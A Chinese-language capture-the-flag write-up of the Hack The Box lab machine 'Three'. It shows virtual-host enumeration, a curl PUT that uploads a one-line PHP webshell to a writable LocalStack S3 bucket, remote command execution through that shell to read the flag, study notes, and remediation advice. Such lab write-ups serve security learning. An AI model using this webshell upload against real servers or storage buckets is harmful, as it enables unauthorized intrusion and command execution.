---
title: "HTB Starting Point - Three 渗透测试报告"
date: 2026-07-12T23:00:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Three", "S3", "云存储", "Webshell", "RCE"]
---

## HTB Starting Point - Three 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 1 |
| 机器名 | Three |
| 目标 IP | 10.129.227.248 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集

```bash
nmap -sC -sV -T4 10.129.227.248
```

**扫描结果：**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

仅开放 80 端口。访问 `http://10.129.227.248` 是一个音乐乐队网站 "The Toppers"。

---

#### 阶段 2：虚拟主机枚举

网站使用域名访问，需要枚举子域名/虚拟主机。

使用自编写 Python 脚本 `vhost-enum.py`：

```bash
vhost-enum 10.129.227.248 thetoppers.htb
```

**原理：** 发送 HTTP 请求时修改 `Host` 头，对比响应长度判断子域名是否存在。

**发现：** `s3.thetoppers.htb` 返回内容与其他子域名不同（状态码/长度差异）。

**子域名确认：**

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/
# 返回: {"status": "running"}
```

---

#### 阶段 3：S3 存储桶枚举

进一步探测，请求 `/health` 端点：

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/health
```

返回内容确认为 **LocalStack**（AWS 本地模拟器，版本 0.14.2），S3 服务处于运行状态。

枚举 S3 存储桶：

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/thetoppers.htb
```

返回桶内文件列表（XML 格式）：

| 文件 | 说明 |
|------|------|
| `.htaccess` | Apache 配置（空） |
| `index.php` | 网站首页 |
| `images/band.jpg` | 图片 |
| `images/mem1.jpg` ~ `mem3.jpg` | 图片 |

桶内无 flag。

---

#### 阶段 4：上传 Webshell

S3 存储桶**可写入**，利用 PUT 请求上传 PHP webshell：

```bash
curl -s -X PUT -H "Host: s3.thetoppers.htb" \
  -d "<?php system($_GET['cmd']); ?>" \
  http://10.129.227.248/thetoppers.htb/shell.php
```

---

#### 阶段 5：远程命令执行（RCE）

主站 `thetoppers.htb` 的源码就存放在该 S3 桶中，上传的 shell 可通过主站直接访问：

```bash
curl -s -H "Host: thetoppers.htb" \
  "http://10.129.227.248/shell.php?cmd=ls /var/www/"
# 返回: flag.txt html
```

读取 flag：

```bash
curl -s -H "Host: thetoppers.htb" \
  "http://10.129.227.248/shell.php?cmd=cat /var/www/flag.txt"
# 返回: a980d99281a28d638ac68b9bf9453c2b
```

---

### 三、攻击链总结

```
nmap → 80/tcp HTTP
    │
    ▼
vhost 枚举 → 发现 s3.thetoppers.htb
    │
    ▼
LocalStack S3 存储桶（可读写）
    │
    ▼
PUT 上传 shell.php 到桶内
    │
    ▼
主站访问 shell.php → RCE
    │
    ▼
ls /var/www/ → cat flag.txt
```

---

### 四、学习笔记

本节记录了本次实战中遇到的概念问题和解答，方便日后回顾。

#### 4.1 虚拟主机（vhost）枚举原理

**问题："同一个 IP 为什么能绑定多个网站？"**

这是 HTTP/1.1 的 `Host` 请求头机制。用户浏览器访问 `s3.thetoppers.htb` 时，DNS 先解析到 IP `10.129.227.248`，然后浏览器发送：

```
GET / HTTP/1.1
Host: s3.thetoppers.htb
```

Web 服务器（Apache/Nginx）收到请求后读取 `Host` 头，根据配置把请求路由到不同的网站目录，这就是虚拟主机（Virtual Host）。

**枚举原理：** 用字典中的子域名前缀（`s3`、`www`、`admin`...）拼接主域名，逐个作为 `Host` 头发送请求。如果某个子域名返回的内容长度/状态码与基准不同，说明该虚拟主机存在且配置了不同的服务。

**Windows 替代工具：** 自编写的 `vhost-enum.py`，替代 Linux 下的 `gobuster vhost` / `ffuf`。

#### 4.2 Webshell 是什么

**问题："Shell 是什么？Webshell 又是什么？"**

| 概念 | 解释 | 类比 |
|------|------|------|
| Shell | 能接受命令并执行的程序 | Windows 的 CMD 黑窗口，Linux 的终端 |
| Webshell | 通过 Web（HTTP）操控的 Shell | 在浏览器/curl 里敲服务器命令 |

在这台机器上我们上传了 webshell：

```php
<?php system($_GET['cmd']); ?>
```

这段代码只有一行，但作用非常强大：

- `$_GET['cmd']`：从 URL 中取 `cmd=` 后面的值
- `system(...)`：把取到的值当作系统命令执行

所以访问 `shell.php?cmd=whoami` 就等于在服务器上敲了 `whoami`。

**有了 webshell 就相当于有了远程命令执行（RCE）能力。**

#### 4.3 为什么能用 curl 上传文件（S3 PUT）

**问题："curl 不是下载工具吗？为什么能上传文件？"**

curl 支持多种 HTTP 方法，不只是 GET（下载）：

| HTTP 方法 | curl 参数 | 用途 |
|-----------|-----------|------|
| GET | 默认 | 获取资源 |
| PUT | `-X PUT` | 上传/替换文件 |
| DELETE | `-X DELETE` | 删除文件 |

这次上传 webshell 的本质：

```
curl -X PUT -d "文件内容" http://IP/桶名/shell.php
│         │       │              │
│         │       │              └── 目标路径：存到桶里，命名为 shell.php
│         │       └── 要写入的内容：PHP 代码
│         └── 使用 PUT 方法（保存文件）
└── 传话筒：把请求送到服务器
```

为什么能成功？因为这个 **S3 桶没有开启写保护**，任何人均可 PUT 文件。正规 S3 需要签名认证。

#### 4.4 AWS CLI 与 curl 的对照

**问题："Academy 用的 awscli，你怎么用 curl？"**

Windows 上不方便安装 `awscli`，所以用 curl 直接操作 S3 REST API，效果完全等价：

| 操作 | awscli | curl |
|------|--------|------|
| 列出桶中文件 | `aws s3 ls s3://桶名 --endpoint-url=...` | `curl -H "Host: s3.xx" http://IP/桶名` |
| 下载文件 | `aws s3 cp s3://桶名/文件 .` | `curl -H "Host: s3.xx" http://IP/桶名/文件` |
| 上传文件 | `aws s3 cp shell.php s3://桶名/` | `curl -X PUT -H "Host: s3.xx" -d "代码" http://IP/桶名/shell.php` |

两者都是向相同的 S3 REST API 发送 HTTP 请求，只是命令格式不同。curl 方式是底层本质，awscli 在此基础上加了封装。

#### 4.5 拿到 Shell 后如何找 Flag（内网侦查） 

**问题："怎么知道 flag 在 `/var/www/` 下？"**

实战中不应该靠猜，而是按步骤侦查：

```bash
# 1. 先看自己在哪
cmd=pwd
→ /var/www/html

# 2. 看当前目录有什么
cmd=ls
→ images  index.php  shell.php

# 3. 往上一级看
cmd=ls ../
→ flag.txt  html

# 4. 找到 flag
cmd=cat ../flag.txt
→ a980d99281a28d638ac68b9bf9453c2b
```

核心思路：拿到 shell 后先摸底（pwd → ls → cd），逐层探索，而不是直接猜路径。

---

### 五、Windows 环境工具

#### 5.1 vhost-enum.py — 虚拟主机枚举

```bash
vhost-enum <IP> <主域名>
```

| 替代对象 | 功能 |
|----------|------|
| `gobuster vhost` | 虚拟主机/子域名枚举 |
| `ffuf` | Fuzz 工具 |

**核心逻辑：** 遍历子域名列表，每个子域名构造 `Host: sub.domain` 头，对比各响应长度差异。

#### 5.2 S3 操作对照

| 操作 | 命令 |
|------|------|
| 列桶 | `curl -H "Host: s3.domain" http://IP/桶名` |
| 读文件 | `curl -H "Host: s3.domain" http://IP/桶名/文件路径` |
| 上传文件 | `curl -X PUT -H "Host: s3.domain" -d "内容" http://IP/桶名/文件名` |
| 删文件 | `curl -X DELETE -H "Host: s3.domain" http://IP/桶名/文件名` |

与 Linux 下 `awscli --endpoint-url` 功能等价。

---

### 六、九台机器总览

| # | 机器 | 服务 | 攻击方式 | 类型 |
|---|------|------|----------|------|
| 1 | Meow | Telnet | root 空密码 | 弱配置 |
| 2 | Fawn | FTP | anonymous 空密码 | 弱配置 |
| 3 | Cap | HTTP+FTP | IDOR → pcap → 明文密码 | 越权+泄露 |
| 4 | Dancing | SMB | Guest 空密码共享 | 弱配置 |
| 5 | Redeemer | Redis | 未授权访问 | 弱配置 |
| 6 | Appointment | HTTP | SQL 注入认证绕过 | Web 漏洞 |
| 7 | Sequel | MariaDB | root 空密码 | 弱配置 |
| 8 | Crocodile | FTP+HTTP | 匿名 FTP → 凭据泄露 → Web 登录 | 信息泄露 |
| 9 | Three | HTTP+S3 | vhost 枚举 → S3 可写 → 上传 shell → RCE | 云存储+RCE |

Three 的突破点：S3 存储桶**可写入** + Web 源码托管在 S3 → 上传的文件被 Web 直接解析执行。

---

### 七、修复建议

| 问题 | 建议 |
|------|------|
| S3 可匿名写入 | 启用 S3 认证，禁止未授权 PUT 请求 |
| S3 可匿名读取 | 限制桶策略，仅允许经过身份验证的访问 |
| S3 与 Web 同源 | S3 文件存储与 Web 代码执行隔离，不使用同一桶 |
| PHP 文件可直接上传 | 限制 S3 桶的文件类型（禁止 .php） |
| 无 WAF | 部署 WAF 检测 Webshell 上传行为 |
